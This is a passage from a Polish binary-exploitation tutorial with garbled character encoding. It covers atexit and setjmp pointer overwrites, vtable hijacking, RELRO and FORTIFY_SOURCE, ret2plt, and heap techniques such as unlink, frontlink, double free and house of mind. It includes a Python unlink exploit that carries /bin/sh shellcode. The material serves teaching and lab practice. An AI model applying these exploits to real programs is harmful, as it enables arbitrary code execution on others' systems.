Na przykÅ‚ad Å‚adunek `%.44xAAAA` zapisze 44B+"AAAA" w zmiennej, co moÅ¼e spowodowaÄ‡ przepeÅ‚nienie bufora.

### **Struktury \_\_atexit**

{% hint style="danger" %}
Obecnie jest bardzo **dziwne, aby to wykorzystaÄ‡**.
{% endhint %}

**`atexit()`** to funkcja, do ktÃ³rej **przekazywane sÄ… inne funkcje jako parametry**. Te **funkcje** zostanÄ… **wykonane** podczas wykonywania **`exit()`** lub **powrotu** do **main**.\
JeÅ›li moÅ¼na **zmodyfikowaÄ‡ adres** dowolnej z tych **funkcji**, aby wskazywaÅ‚ na shellcode na przykÅ‚ad, uzyskasz **kontrolÄ™** nad **procesem**, ale obecnie jest to bardziej skomplikowane.\
Obecnie **adresy funkcji** do wykonania sÄ… **ukryte** za kilkoma strukturami, a ostatecznie adres, na ktÃ³ry wskazujÄ…, nie sÄ… adresami funkcji, lecz sÄ… **zaszyfrowane za pomocÄ… operacji XOR** i przesuniÄ™Ä‡ z **losowym kluczem**. Dlatego obecnie ten wektor ataku **nie jest bardzo przydatny przynajmniej na x86** i **x64\_86**.\
Funkcja **szyfrowania** to **`PTR_MANGLE`**. **Inne architektury** takie jak m68k, mips32, mips64, aarch64, arm, hppa... **nie implementujÄ… funkcji szyfrowania**, poniewaÅ¼ **zwracajÄ… to samo**, co otrzymaÅ‚y jako dane wejÅ›ciowe. Dlatego te architektury mogÄ… byÄ‡ podatne na ten wektor ataku.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Obecnie jest bardzo **dziwne, aby to wykorzystaÄ‡**.
{% endhint %}

**`Setjmp()`** pozwala **zapisaÄ‡** kontekst (rejestry)\
**`longjmp()`** pozwala **przywrÃ³ciÄ‡** kontekst.\
Zapisane rejestry to: `EBX, ESI, EDI, ESP, EIP, EBP`\
To, co siÄ™ dzieje, to Å¼e EIP i ESP sÄ… przekazywane przez funkcjÄ™ **`PTR_MANGLE`**, wiÄ™c **architektura podatna na ten atak jest taka sama jak powyÅ¼ej**.\
SÄ… one przydatne do odzyskiwania bÅ‚Ä™dÃ³w lub przerwaÅ„.\
Jednak z tego, co przeczytaÅ‚em, inne rejestry nie sÄ… chronione, **wiÄ™c jeÅ›li wewnÄ…trz wywoÅ‚ywanej funkcji jest `call ebx`, `call esi` lub `call edi`**, kontrolÄ™ moÅ¼na przejÄ…Ä‡. Lub moÅ¼na rÃ³wnieÅ¼ zmodyfikowaÄ‡ EBP, aby zmodyfikowaÄ‡ ESP.

**VTable i VPTR w C++**

KaÅ¼da klasa ma **Vtable**, ktÃ³ra jest tablicÄ… **wskaÅºnikÃ³w do metod**.

KaÅ¼dy obiekt **klasy** ma **VPtr**, ktÃ³ry jest **wskaÅºnikiem** do tablicy swojej klasy. VPtr jest czÄ™Å›ciÄ… nagÅ‚Ã³wka kaÅ¼dego obiektu, wiÄ™c jeÅ›li osiÄ…gniÄ™to **nadpisanie** VPtr, moÅ¼na je **zmodyfikowaÄ‡**, aby wskazywaÅ‚o na metodÄ™ zastÄ™pczÄ…, dziÄ™ki czemu wykonanie funkcji przejdzie do shellcode'u.

## **Zapobieganie i unikanie**

**Return-into-printf**

To technika zamiany przepeÅ‚nienia bufora na bÅ‚Ä…d formatu Å‚aÅ„cucha. Polega na zmianie EIP, aby wskazywaÅ‚ na printf funkcji i przekazaniu mu sformatowanego Å‚aÅ„cucha, aby uzyskaÄ‡ informacje o stanie procesu.

**Atak na biblioteki**

Biblioteki majÄ… pozycjÄ™ z 16-bitowÄ… losowoÅ›ciÄ… = 65636 moÅ¼liwych adresÃ³w. JeÅ›li serwer podatny wywoÅ‚uje fork(), przestrzeÅ„ adresowa pamiÄ™ci jest klonowana w procesie potomnym i pozostaje nietkniÄ™ta. Dlatego moÅ¼na sprÃ³bowaÄ‡ przeprowadziÄ‡ atak siÅ‚owy na funkcjÄ™ usleep() z libc, przekazujÄ…c jej argument "16", aby gdy odpowiedÅº zajmie dÅ‚uÅ¼ej niÅ¼ zwykle, funkcja zostanie znaleziona. ZnajÄ…c lokalizacjÄ™ tej funkcji, moÅ¼na uzyskaÄ‡ delta\_mmap i obliczyÄ‡ pozostaÅ‚e.

Jedynym sposobem, aby mieÄ‡ pewnoÅ›Ä‡, Å¼e ASLR dziaÅ‚a, jest korzystanie z architektury 64-bitowej. Tam nie ma atakÃ³w siÅ‚owych.

### Relro

**Relro (Read only Relocation)** wpÅ‚ywa na uprawnienia pamiÄ™ci podobnie jak NX. RÃ³Å¼nica polega na tym, Å¼e podczas gdy NX sprawia, Å¼e stos jest wykonywalny, RELRO sprawia, Å¼e **pewne rzeczy sÄ… tylko do odczytu**, wiÄ™c **nie moÅ¼emy zapisywaÄ‡** do nich. NajczÄ™stszÄ… przeszkodÄ…, jakÄ… widziaÅ‚em, jest uniemoÅ¼liwienie nam wykonania **nadpisania tabeli `got`**, o czym bÄ™dzie mowa pÃ³Åºniej. Tabela `got` przechowuje adresy funkcji libc, dziÄ™ki czemu binarny plik wie, jakie sÄ… adresy i moÅ¼e je wywoÅ‚aÄ‡. Zobaczmy, jak wyglÄ…dajÄ… uprawnienia pamiÄ™ci dla wpisu tabeli `got` dla binarnego pliku z i bez relro.

Z relro:
```bash
gefâ¤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefâ¤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefâ¤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  â†’   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Bez relro:
```bash
gefâ¤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefâ¤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefâ¤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  â†’   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Dla binarnego **bez relro**, moÅ¼emy zauwaÅ¼yÄ‡, Å¼e adres wpisu `got` dla `fgets` to `0x404018`. PatrzÄ…c na mapowanie pamiÄ™ci, widzimy, Å¼e mieÅ›ci siÄ™ miÄ™dzy `0x404000` a `0x405000`, co ma **uprawnienia `rw`**, co oznacza, Å¼e moÅ¼emy odczytywaÄ‡ i zapisywaÄ‡ do niego. Dla binarnego **z relro**, widzimy, Å¼e adres tabeli `got` dla uruchomienia binarnego (wÅ‚Ä…czony jest `pie`, wiÄ™c ten adres siÄ™ zmieni) to `0x555555557fd0`. W mapowaniu pamiÄ™ci tego binarnego mieÅ›ci siÄ™ miÄ™dzy `0x0000555555557000` a `0x0000555555558000`, co ma uprawnienia pamiÄ™ci **`r`**, co oznacza, Å¼e moÅ¼emy tylko odczytywaÄ‡ z niego.

WiÄ™c jaki jest **sposÃ³b obejÅ›cia**? Typowe obejÅ›cie, ktÃ³re stosujÄ™, to po prostu nie zapisywaÄ‡ do obszarÃ³w pamiÄ™ci, ktÃ³re relro powoduje, Å¼e sÄ… tylko do odczytu, i **znaleÅºÄ‡ innÄ… metodÄ™ wykonania kodu**.

ZauwaÅ¼, Å¼e aby to miaÅ‚o miejsce, binarny musi znaÄ‡ wczeÅ›niej adresy funkcji:

* Leniwe wiÄ…zanie: Adres funkcji jest wyszukiwany za pierwszym razem, gdy funkcja jest wywoÅ‚ywana. Dlatego GOT musi mieÄ‡ uprawnienia do zapisu podczas wykonywania.
* WiÄ…zanie teraz: Adresy funkcji sÄ… rozwiÄ…zane na poczÄ…tku wykonania, a nastÄ™pnie sekcjom wraÅ¼liwym takim jak .got, .dtors, .ctors, .dynamic, .jcr nadane sÄ… uprawnienia tylko do odczytu. `` `** ``-z relro`**`y`**`-z now\`\*\*

Aby sprawdziÄ‡, czy program uÅ¼ywa WiÄ…zania teraz, moÅ¼na wykonaÄ‡:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Cuando binarny jest zaÅ‚adowany do pamiÄ™ci i funkcja jest wywoÅ‚ywana po raz pierwszy, skacze siÄ™ do PLT (Procedure Linkage Table), skÄ…d nastÄ™puje skok (jmp) do GOT i odkrywa, Å¼e ten wpis nie zostaÅ‚ rozwiÄ…zany (zawiera adres nastÄ™pnej instrukcji z PLT). NastÄ™pnie Runtime Linker lub rtfd jest wywoÅ‚ywany, aby rozwiÄ…zaÄ‡ adres i zapisaÄ‡ go w GOT.

Podczas wywoÅ‚ywania funkcji, PLT jest wywoÅ‚ywane, ktÃ³re zawiera adres GOT, gdzie przechowywany jest adres funkcji, wiÄ™c przekierowuje przepÅ‚yw tam i wywoÅ‚uje funkcjÄ™. JednakÅ¼e, jeÅ›li jest to pierwsze wywoÅ‚anie funkcji, GOT zawiera nastÄ™pnÄ… instrukcjÄ™ z PLT, wiÄ™c przepÅ‚yw kontynuuje kod z PLT (rtfd) i uzyskuje adres funkcji, zapisuje go w GOT i wywoÅ‚uje.

Podczas Å‚adowania binarnego do pamiÄ™ci, kompilator mÃ³wi, w jakim przesuniÄ™ciu naleÅ¼y umieÅ›ciÄ‡ dane do zaÅ‚adowania podczas uruchamiania programu.

Lazy binding â€”> Adres funkcji jest wyszukiwany tylko przy pierwszym wywoÅ‚aniu tej funkcji, wiÄ™c GOT ma uprawnienia do zapisu, aby zapisaÄ‡ go tam i nie trzeba byÅ‚o ponownie go szukaÄ‡.

Bind now â€”> Adresy funkcji sÄ… wyszukiwane podczas Å‚adowania programu, a uprawnienia sekcji .got, .dtors, .ctors, .dynamic, .jcr sÄ… zmieniane na tylko do odczytu. **-z relro** i **-z now**

Mimo to, ogÃ³lnie programy nie sÄ… skomplikowane z tymi opcjami, wiÄ™c te ataki nadal sÄ… moÅ¼liwe.

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** â€”> Aby sprawdziÄ‡, czy uÅ¼ywajÄ… BIND NOW

**Fortify Source -D\_FORTIFY\_SOURCE=1 lub =2**

Stara siÄ™ zidentyfikowaÄ‡ funkcje, ktÃ³re kopiujÄ… dane z jednego miejsca do drugiego w sposÃ³b niebezpieczny i zamienia funkcjÄ™ na bezpiecznÄ….

Na przykÅ‚ad:\
char buf\[16];\
strcpy(but, source);

Rozpoznaje to jako niebezpieczne i zamienia strcpy() na \_\_strcpy\_chk(), uÅ¼ywajÄ…c rozmiaru bufora jako maksymalnego rozmiaru do skopiowania.

RÃ³Å¼nica miÄ™dzy **=1** a **=2** polega na tym, Å¼e:

Druga nie pozwala, aby **%n** pochodziÅ‚o z sekcji z uprawnieniami do zapisu. Ponadto parametr do bezpoÅ›redniego dostÄ™pu do argumentÃ³w moÅ¼e byÄ‡ uÅ¼ywany tylko wtedy, gdy uÅ¼ywane sÄ… wczeÅ›niejsze, czyli moÅ¼na uÅ¼yÄ‡ **%3$d** tylko jeÅ›li wczeÅ›niej uÅ¼yto **%2$d** i **%1$d**

Aby wyÅ›wietliÄ‡ komunikat o bÅ‚Ä™dzie, uÅ¼ywa siÄ™ argv\[0\], wiÄ™c jeÅ›li umieÅ›cisz tam adres innego miejsca (np. zmiennej globalnej), komunikat o bÅ‚Ä™dzie pokaÅ¼e zawartoÅ›Ä‡ tej zmiennej. Strona 191

**ZastÄ…pienie Libsafe**

WÅ‚Ä…cza siÄ™ to za pomocÄ…: LD\_PRELOAD=/lib/libsafe.so.2\
lub\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

NiektÃ³re niebezpieczne funkcje sÄ… zastÄ™powane bezpieczniejszymi. Nie jest to standaryzowane. (tylko dla x86, nie dla kompilacji z -fomit-frame-pointer, nie dla kompilacji statycznych, nie wszystkie funkcje podatne na atak stajÄ… siÄ™ bezpieczne, a LD\_PRELOAD nie dziaÅ‚a w binariach z ustawionym suid).

**ASCII Armored Address Space**

Polega na Å‚adowaniu wspÃ³Å‚dzielonych bibliotek od 0x00000000 do 0x00ffffff, aby zawsze byÅ‚ bajt 0x00. JednakÅ¼e to praktycznie nie zatrzymuje Å¼adnego ataku, a tym bardziej w little endian.

**ret2plt**

Polega na wykonaniu ROP w taki sposÃ³b, Å¼e wywoÅ‚ywana jest funkcja strcpy@plt (z plt), a nastÄ™pnie wskazuje siÄ™ na wpis w GOT i kopiowany jest pierwszy bajt funkcji, do ktÃ³rej chcemy siÄ™ odwoÅ‚aÄ‡ (system()). NastÄ™pnie to samo jest robione wskazujÄ…c na GOT+1 i kopiujÄ…c 2. bajt system()... Na koÅ„cu wywoÅ‚ywany jest zapisany adres w GOT, ktÃ³ry bÄ™dzie system()

**Falso EBP**

Dla funkcji, ktÃ³re uÅ¼ywajÄ… EBP jako rejestru wskazujÄ…cego na argumenty, zmieniajÄ…c EIP i wskazujÄ…c na system(), EBP rÃ³wnieÅ¼ musi zostaÄ‡ zmieniony, aby wskazywaÅ‚ na obszar pamiÄ™ci zawierajÄ…cy 2 dowolne bajty, a nastÄ™pnie adres do &â€/bin/shâ€.

**Jaulas con chroot()**

debootstrap -arch=i386 hardy /home/user â€”> Instaluje podstawowy system w okreÅ›lonym podkatalogu

Administrator moÅ¼e wyjÅ›Ä‡ z takiej klatki wykonujÄ…c: mkdir foo; chroot foo; cd ..

**Instrumentacja kodu**

Valgrind â€”> Wyszukuje bÅ‚Ä™dy\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 PrzepeÅ‚nienia sterty: Podstawowe ataki**

**Przydzielony kawaÅ‚ek**

prev\_size |\
size | â€”NagÅ‚Ã³wek\
\*mem | Dane

**Wolny kawaÅ‚ek**

prev\_size |\
size |\
\*fd | WskaÅºnik do przodu\
\*bk | WskaÅºnik do tyÅ‚u â€”NagÅ‚Ã³wek\
\*mem | Dane

Wolne kawaÅ‚ki sÄ… w liÅ›cie podwÃ³jnie poÅ‚Ä…czonej (bin) i nigdy nie mogÄ… wystÄ™powaÄ‡ dwa wolne kawaÅ‚ki obok siebie (sÄ… Å‚Ä…czone)

W "size" sÄ… bity wskazujÄ…ce: czy poprzedni kawaÅ‚ek jest uÅ¼ywany, czy kawaÅ‚ek zostaÅ‚ przydzielony za pomocÄ… mmap() i czy kawaÅ‚ek naleÅ¼y do gÅ‚Ã³wnego obszaru.

JeÅ›li zwolniony kawaÅ‚ek ma sÄ…siednie wolne kawaÅ‚ki, sÄ… one Å‚Ä…czone za pomocÄ… makra unlink() i nowy, wiÄ™kszy kawaÅ‚ek jest przekazywany do frontlink(), aby wstawiÄ‡ go do odpowiedniego binu.

unlink(){\
BK = P->bk; â€”> BK nowego kawaÅ‚ka to ten, ktÃ³ry miaÅ‚ juÅ¼ wczeÅ›niej wolny kawaÅ‚ek\
FD = P->fd; â€”> FD nowego kawaÅ‚ka to ten, ktÃ³ry miaÅ‚ juÅ¼ wczeÅ›niej wolny kawaÅ‚ek\
FD->bk = BK; â€”> BK nastÄ™pnego kawaÅ‚ka wskazuje na nowy kawaÅ‚ek\
BK->fd = FD; â€”> FD poprzedniego kawaÅ‚ka wskazuje na nowy kawaÅ‚ek\
}

Dlatego jeÅ›li uda nam siÄ™ zmodyfikowaÄ‡ P->bk na adres shellcode i P->fd na adres z GOT lub DTORS pomniejszony o 12, osiÄ…gniemy:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

W ten sposÃ³b po opuszczeniu programu zostanie wykonana shellcode.

Dodatkowo, 4. instrukcja unlink() zapisuje coÅ›, a shellcode musi byÄ‡ dostosowana do tego:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) â€”> Powoduje to zapisanie 4 bajtÃ³w od 8 bajtu shellcode, wiÄ™c pierwsza instrukcja shellcode musi byÄ‡ skokiem, aby ominÄ…Ä‡ to i przejÅ›Ä‡ do nops prowadzÄ…cych do reszty shellcode.

Dlatego exploit jest tworzony:

W buforze1 umieszczamy shellcode zaczynajÄ…c od skoku, aby przejÅ›Ä‡ do nops lub reszty shellcode.

Po shellcode dodajemy wypeÅ‚nienie do osiÄ…gniÄ™cia pola prev\_size i size nastÄ™pnego kawaÅ‚ka. W tych miejscach umieszczamy 0xfffffff0 (aby nadpisaÄ‡ prev\_size i ustawiÄ‡ bit informujÄ…cy, Å¼e jest wolny) i â€œ-4â€œ(0xfffffffc) w size (aby podczas sprawdzania w 3. kawaÅ‚ku, czy 2. byÅ‚ wolny, faktycznie przejdzie do zmodyfikowanego prev\_size, ktÃ³ry powie, Å¼e jest wolny) -> Dlatego gdy free() sprawdza, przejdzie do size 3., ale faktycznie przejdzie do 2. - 4 i uzna, Å¼e 2. kawaÅ‚ek jest wolny. NastÄ™pnie zostanie wywoÅ‚ane **unlink()**.

Podczas wywoÅ‚ywania unlink() uÅ¼ywa siÄ™ jako P->fd pierwszych danych z 2. kawaÅ‚ka, wiÄ™c tam zostanie wstawiony adres do nadpisania - 12 (poniewaÅ¼ w FD->bk zostanie dodane 12 do adresu przechowywanego w FD). A pod tÄ… adresem wprowadzana jest druga adresem znaleziona w 2. kawaÅ‚ku, ktÃ³ra bÄ™dzie interesujÄ…ca dla nas jako adres shellcode (faÅ‚szywy P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #WaÅ¼ne, aby bit wskazujÄ…cy, Å¼e poprzedni kawaÅ‚ek jest wolny, byÅ‚ ustawiony na 1**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, aby program myÅ›laÅ‚, Å¼e "size" trzeciego kawaÅ‚ka jest przesuniÄ™ty o 4 bajty (wskaÅ¼e na prev\_size), bo tam sprawdza, czy drugi kawaÅ‚ek jest wolny**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Na poczÄ…tku Å‚adujemy 8 bajtÃ³w wypeÅ‚nienia do payloadu**

**got\_free = pack("\<I", 0x08048300 - 12) #Adres free() w plt-12 (bÄ™dzie nadpisany, aby wykonaÄ‡ shellcode drugi raz, gdy free() zostanie wywoÅ‚ane ponownie)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Jak wspomniano, payload zaczyna siÄ™ od 8 bajtÃ³w wypeÅ‚nienia**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Modyfikujemy drugi kawaÅ‚ek, got\_free wskazuje, gdzie zapiszemy adres addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() zwalniajÄ…c w odwrotnej kolejnoÅ›ci (wargame)**

Kontrolujemy 3 kolejne kawaÅ‚ki i sÄ… one zwalniane w odwrotnej kolejnoÅ›ci niÅ¼ rezerwowane.

W tym przypadku:

W kawaÅ‚ku c umieszczamy shellcode

KawaÅ‚ek a uÅ¼ywamy do nadpisania b, aby rozmiar miaÅ‚ wyÅ‚Ä…czony bit PREV\_INUSE, aby program myÅ›laÅ‚, Å¼e kawaÅ‚ek a jest wolny.

Dodatkowo, nadpisujemy rozmiar w nagÅ‚Ã³wku b, aby wynosiÅ‚ -4.

W rezultacie program uzna, Å¼e "a" jest wolny i w binie, wiÄ™c wywoÅ‚a unlink(), aby go odÅ‚Ä…czyÄ‡. JednakÅ¼e, poniewaÅ¼ nagÅ‚Ã³wek PREV\_SIZE wynosi -4, uzna, Å¼e kawaÅ‚ek "a" zaczyna siÄ™ naprawdÄ™ w b+4. Innymi sÅ‚owy, wywoÅ‚a unlink() na kawaÅ‚ek, ktÃ³ry zaczyna siÄ™ w b+4, wiÄ™c w b+12 bÄ™dzie wskaÅºnik "fd", a w b+16 bÄ™dzie wskaÅºnik "bk".

W ten sposÃ³b, jeÅ›li w bk umieÅ›cimy adres shellcode, a w fd adres funkcji "puts()"-12, mamy nasz payload.

**Technika Frontlink**

Frontlink jest wywoÅ‚ywany, gdy coÅ› jest zwalniane i Å¼aden z sÄ…siednich kawaÅ‚kÃ³w nie jest wolny, wtedy nie jest wywoÅ‚ywane unlink(), tylko bezpoÅ›rednio frontlink().

UÅ¼yteczna podatnoÅ›Ä‡, gdy atakowany malloc nigdy nie jest zwalniany (free()).

Wymagane:

Bufor, ktÃ³ry moÅ¼e zostaÄ‡ przepeÅ‚niony funkcjÄ… wejÅ›ciowÄ…

Bufor sÄ…siadujÄ…cy, ktÃ³ry zostanie zwolniony, a pole fd w jego nagÅ‚Ã³wku zostanie zmodyfikowane dziÄ™ki przepeÅ‚nieniu poprzedniego bufora

Bufor do zwolnienia o rozmiarze wiÄ™kszym niÅ¼ 512, ale mniejszym niÅ¼ poprzedni bufor

Bufor zadeklarowany przed krokiem 3, ktÃ³ry pozwala na nadpisanie prev\_size tego bufora

DziÄ™ki temu moÅ¼na nadpisaÄ‡ dwa mallocs w sposÃ³b niekontrolowany i jeden w sposÃ³b kontrolowany, ale tylko ten jeden jest zwalniany, co pozwala na exploit.

**PodatnoÅ›Ä‡ double free()**

JeÅ›li free() jest wywoÅ‚ywane dwa razy z tym samym wskaÅºnikiem, powstajÄ… dwa biny wskazujÄ…ce na ten sam adres.

JeÅ›li chcemy ponownie uÅ¼yÄ‡ jednego, nie ma problemu. JeÅ›li chcemy uÅ¼yÄ‡ drugiego, zostanie przydzielona ta sama przestrzeÅ„, wiÄ™c mamy faÅ‚szywe wskaÅºniki "fd" i "bk" z danymi, ktÃ³re zapisze poprzednia rezerwacja.

**After free()**

WczeÅ›niej zwolniony wskaÅºnik jest ponownie uÅ¼ywany bez kontroli.

## **8 PrzepeÅ‚nienia sterty: Zaawansowane exploitacje**

Techniki Unlink() i FrontLink() zostaÅ‚y usuniÄ™te po zmianie funkcji unlink().

**The house of mind**

Wystarczy jedno wywoÅ‚anie free(), aby spowodowaÄ‡ wykonanie arbitralnego kodu. WaÅ¼ne jest znalezienie drugiego kawaÅ‚ka, ktÃ³ry moÅ¼e zostaÄ‡ przepeÅ‚niony przez poprzedni i zwolniony.

WywoÅ‚anie free() powoduje wywoÅ‚anie public\_fREe(mem), co robi:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> Zwraca wskaÅºnik na adres poczÄ…tku kawaÅ‚ka (mem-8)

â€¦

ar\_ptr = arena\_for_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

W \[1] sprawdzany jest rozmiar pola bitowego NON\_MAIN\_ARENA, ktÃ³ry moÅ¼na zmieniÄ‡, aby sprawdzenie zwrÃ³ciÅ‚o true i wywoÅ‚aÅ‚o heap\_for\_ptr(), ktÃ³re wykonuje operacjÄ™ and na "mem", ustawiajÄ…c na 0 2,5 najmniej znaczÄ…cych bajtÃ³w (w naszym przypadku z 0x0804a000 robi 0x08000000) i uzyskuje dostÄ™p do 0x08000000->ar\_ptr (jak do struct heap\_info)

Dlatego jeÅ›li moÅ¼emy kontrolowaÄ‡ kawaÅ‚ek na przykÅ‚ad w 0x0804a000 i kawaÅ‚ek zostanie zwolniony w **0x081002a0**, moÅ¼emy dotrzeÄ‡ do adresu 0x08100000 i zapisaÄ‡, na przykÅ‚ad, **0x0804a000**. Gdy ten drugi kawaÅ‚ek zostanie zwolniony, heap\_for\_ptr(ptr)->ar\_ptr zwrÃ³ci to, co napisaliÅ›my w 0x08100000 (poniewaÅ¼ stosuje siÄ™ do 0x081002a0 operacjÄ™ and, ktÃ³rÄ… widzieliÅ›my wczeÅ›niej, i stÄ…d wyciÄ…ga wartoÅ›Ä‡ 4 pierwszych bajtÃ³w, ar\_ptr)

W ten sposÃ³b zostanie wywoÅ‚ane \_int\_free(ar\_ptr, mem), czyli **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Jak widzieliÅ›my wczeÅ›niej, moÅ¼emy kontrolowaÄ‡ wartoÅ›Ä‡ av, poniewaÅ¼ to, co piszemy w zwalnianym kawaÅ‚ku, jest tym, co zostanie zapisane.

Zgodnie z definicjÄ… unsorted\_chunks, wiemy, Å¼e:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Dlatego jeÅ›li w av->bins\[2] zapiszemy wartoÅ›Ä‡ \_\_DTOR\_END\_\_-12, w ostatniej instrukcji zostanie zapisane w \_\_DTOR\_END\_\_ adres drugiego kawaÅ‚ka.

Innymi sÅ‚owy, na poczÄ…tku pierwszego kawaÅ‚ka musimy umieÅ›ciÄ‡ wiele razy adres \_\_DTOR\_END\_\_-12, poniewaÅ¼ av->bins\[2] to z niego weÅºmie.

